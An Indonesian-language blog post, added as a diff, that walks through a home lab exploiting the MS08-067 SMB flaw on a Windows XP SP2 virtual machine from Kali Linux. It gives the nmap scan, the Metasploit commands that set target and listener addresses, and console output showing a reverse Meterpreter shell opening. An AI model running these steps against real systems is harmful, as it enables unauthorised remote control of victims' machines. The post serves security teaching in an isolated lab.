@@ -1,0 +1,158 @@
+---
+title: "Metasploit pada windows xp sp2"
+date: 2018-11-15T23:58:25+07:00
+draft: false
+---
+
+### Persiapan
+
+Untuk ujicoba metasploit, kita akan menggunakan tools bawaan kali linux. Yang diperlukan untuk praktik ini adalah aplikasi virtualbox, windows XP SP2, dan kali linux. Gunakan memori minimal jika anda hanya memiliki memori 2GB. Misalkan Kali linux, memori 512MB dan Windows, memori 256MB
+
+
+#### Import VM Kali linux
+
+Untuk import file ova kali linux, masuk ke aplikasi virtualbox - klik file - import appliance - pilih file OVA yang akan diimport. Caranya seperti gambar berikut:
+
+Selanjutnya ikutin saja langkah-langkahnya. Setelah berhasil diimport matikan USB mode VM melalui preferences.
+
+
+
+#### Import VM windows XP SP2
+
+Untuk membuat VM baru, klik new - isi nama VM - pilih lokasi hardisk (pilih file VDI yang akan digunakan). Lakukan seperti gambar berikut ini:
+
+Setelah kedua VM berhasil dibuat, selanjutnya anda perlu melakukan konfigurasi network.
+
+
+
+#### Konfigurasi jaringan
+
+Pada konfigurasi virtualbox, kedua VM dibuat mode network bridge - pilih nama interface ethernet anda. Bisa dilihat seperti gambar dibawah ini:
+
+Setelah selesai konfigurasi, anda dapat menjalankan kedua VM dan setelah masuk catatlah IP dari kedua VM tersebut. Gunakan perintah **ifconfig** untuk melihat IP dari VM tersebut. Dalam model praktik diatas IP VM kali linux adalah **192.168.10.1** dan IP VM windows XP SP2 adalah **192.168.10.2**. _Alamat IP address bisa berbeda setiap mesin, jadi sebaiknya anda sesuaikan dengan kondisi konfigurasi jaringan anda_.
+
+
+
+### Skenario
+
+Dalam praktik ini, skenario yang digunakan adalah dengan memanfaatkan salah satu kelemahan dari protokol samba. Protokol ini umumnya digunakan untuk sharing file/direktori di windows. Dengan mengetahui celah keamanan dari protokol ini, anda dapat masuk kedalam sistem operasi windows.
+
+Buatlah folder/direktori pada windows XP, dan setting agar dapat direktori tersebut dapat diakses oleh pengguna lain dengan menggunakan sistem sharing. Caranya: klik kanan direktori yang akan di sharing - pilih sharing and security - lalu checklist direktori yang akan di sharing.
+
+Setelah selesai, anda dapat masuk ke sistem operasi kali linux. Gunakan user: **root**, dan password: **toor** untuk dapat masuk kedalam sistem operasi kali linux.
+
+
+
+### Identifikasi celah keamanan dengan NMAP
+
+Identifikasi digunakan untuk mengetahui celah keamanan yang ada pada sebuah sistem. Dalam praktik ini menggunakan NMAP. Klik application - pilih information gathering - pilih zenmap. Kemudian masukkan alamat ip target seperti gambar berikut:
+
+
+_Anda dapat melihat port 445 dengan status open. Dengan NMAP sebenarnya kita juga dapat melakukan proses information gathering dengan opsi script. Opsi ini memungkinkan untuk mencari celah keamanan berdasarkan bugs/exploit dari aplikasi yang dituju._
+
+
+
+### Exploit Sistem Windows
+
+Kali linux sudah memiliki beberapa tools yang dapat digunakan untuk melakukan proses exploit, dalam praktik ini akan digunakan metasploit. Klik menu application - pilih favorit - pilih metasploit. Setelahnya metasploit akan berjalan dan masuk kedalam console tools tersebut, seperti gambar berikut ini:
+
+Kemudian untuk mencari exploit, bisa menggunakan perintah: search <kata kunci nama exploit>. Misalkan untuk mencari nama exploit ms08_067 gunakan perintah:
+
+
+```
+msf > search ms08_067
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date  Rank   Description
+   ----                                 ---------------  ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
+```
+
+
+Untuk menggunakan exploit gunakan perintah use <nama exploit>, seperti contoh berikut:
+
+
+```
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > 
+```
+
+
+Kemudian gunakan perintah show options untuk melihat opsi yang dapat digunakan.
+
+
+```
+msf exploit(ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+```
+
+
+RHOST adalah alamat ip target, RPORT adalah alamat port target. Selanjutnya untuk 
+
+Menentukan alamat ip target (sesuaikan ip target anda), gunakan perintah berikut:
+
+
+```
+msf exploit(ms08_067_netapi) > set rhost 192.168.10.2
+```
+
+
+LHOST dan LPORT adalah sistem yang melakukan proses exploit dalam hal ini adalah mesin kali linux itu sendiri 
+
+
+```
+msf exploit(ms08_067_netapi) > set lhost 192.168.10.1
+lhost => 192.168.10.1
+msf exploit(ms08_067_netapi) > set lport 888
+lport => 888
+```
+
+
+Proses selanjutnya adalah melakukan proses exploit terhadap sistem yang menjadi target. Anda dapat menggunakan perintah `exploit`. Jika bugs/celah keamanan telah ditutup proses exploit bisa saja gagal.
+
+
+```
+msf exploit(ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.7:888 
+[*] 192.168.1.6:445 - Automatically detecting the target...
+[*] 192.168.1.6:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.1.6:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.1.6:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179267 bytes) to 192.168.1.6
+[*] Meterpreter session 1 opened (192.168.1.7:888 -> 192.168.1.6:1030) at 2018-11-11 06:13:54 -0500
+
+meterpreter >
+```
+
+
+Setelah anda mendapatkan meterpreter console artinya anda sudah masuk ke shell sistem windows XP atau DOS. Anda bisa mencoba beberapa perintah DOS untuk memastikan bahwa anda berada dalam sistem tersebut. Misalkan perintah sysinfo.
+
+
+```
+meterpreter > sysinfo 
+Computer        : MYHOME-B4BC98C5
+OS              : Windows XP (Build 2600, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+```
+
